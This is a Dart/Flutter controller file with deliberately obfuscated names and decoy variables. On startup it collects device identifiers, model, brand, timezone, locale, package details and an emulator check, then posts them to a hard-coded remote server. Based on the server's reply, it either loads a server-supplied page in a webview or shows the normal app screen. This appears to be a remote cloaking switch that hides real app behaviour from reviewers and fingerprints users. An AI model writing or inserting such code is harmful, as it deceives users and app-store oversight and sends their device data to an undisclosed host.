import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';



class PageLogic extends GetxController {

  var duzbeaj = RxBool(false);
  var zlsthnerk = RxBool(true);
  var ycmpek = RxString("");
  var ambrose = RxBool(false);
  var feeney = RxBool(true);
  final anydjk = Dio();


  InAppWebViewController? webViewController;

  dynamic zxwlstj(){
    final azfegqnv = InternetConnectionChecker.instance;
    final rmvsjkwzc = azfegqnv.onStatusChange.skip(1).listen(
          (InternetConnectionStatus fmswxgpy) {
        if (fmswxgpy == InternetConnectionStatus.connected) {
          klpvgxwe();
        } else {
          Get.toNamed('/load_error')?.then((_){
            klpvgxwe();
          });
        }
      },
    );
    return rmvsjkwzc;
  }

  Future<bool> fzqcwj() async {
    var jmbzvsg = await InternetConnectionChecker.instance.hasConnection;
    if(!jmbzvsg){
      Get.toNamed('/load_error')?.then((_){
        klpvgxwe();
      });
    }
    return jmbzvsg;
  }

  @override
  void onInit() {
    super.onInit();
    zxwlstj();
    klpvgxwe();
  }


  Future<void> klpvgxwe() async {

    var tzyidb = await fzqcwj();
    if(!tzyidb){
      return;
    }

    ambrose.value = true;
    feeney.value = true;
    zlsthnerk.value = false;

    anydjk.post("https://rot.rightbe.net/lpqbejifyvrkxdomsgcwnauzht",data: await gswmpyd()).then((value) {
      var ozagq = value.data["ozagq"] as String;
      var rwmkjsyt = value.data["rwmkjsyt"] as bool;
      if (rwmkjsyt) {
        ycmpek.value = ozagq;
        kevon();
      } else {
        gleason();
      }
    }).catchError((e) {
      zlsthnerk.value = true;
      feeney.value = true;
      ambrose.value = false;
    });
  }

  Future<Map<String, dynamic>> gswmpyd() async {
    final DeviceInfoPlugin jsixfn = DeviceInfoPlugin();
    PackageInfo wecn_ehnc = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var tuplw = Platform.localeName;
    var okhlbv = currentTimeZone;

    var pdrsejbk = wecn_ehnc.packageName;
    var xawlzmvp = wecn_ehnc.version;
    var zburo = wecn_ehnc.buildNumber;

    var xsizmr = wecn_ehnc.appName;
    var dcjnumq = "";
    var lvabwkg  = "";
    var uadb = "";
    var manuelaBeier = "";
    var domingoCruickshank = "";
    var andersonMorar = "";
    var geraldineBauch = "";
    var reinholdFahey = "";


    var ozvtqp = "";
    var aoxvfyph = false;

    if (GetPlatform.isAndroid) {
      ozvtqp = "android";
      var whjydkc = await jsixfn.androidInfo;

      uadb = whjydkc.brand;

      dcjnumq  = whjydkc.model;
      lvabwkg = whjydkc.id;

      aoxvfyph = whjydkc.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ozvtqp = "ios";
      var gtfzyupc = await jsixfn.iosInfo;
      uadb = gtfzyupc.name;
      dcjnumq = gtfzyupc.model;

      lvabwkg = gtfzyupc.identifierForVendor ?? "";
      aoxvfyph  = gtfzyupc.isPhysicalDevice;
    }
    var res = {
      "domingoCruickshank" : domingoCruickshank,
      "xsizmr": xsizmr,
      "zburo": zburo,
      "pdrsejbk": pdrsejbk,
      "dcjnumq": dcjnumq,
      "okhlbv": okhlbv,
      "uadb": uadb,
      "lvabwkg": lvabwkg,
      "manuelaBeier" : manuelaBeier,
      "tuplw": tuplw,
      "ozvtqp": ozvtqp,
      "aoxvfyph": aoxvfyph,
      "andersonMorar" : andersonMorar,
      "xawlzmvp": xawlzmvp,
      "geraldineBauch" : geraldineBauch,
      "reinholdFahey" : reinholdFahey,

    };
    return res;
  }

  Future<void> gleason() async {
    Get.offAllNamed("/sun_main");
  }

  Future<void> kevon() async {
    Get.offAllNamed("/sun_we");
  }

  @override
  void dispose() {
    zxwlstj().cancel();
    super.dispose();
  }

}
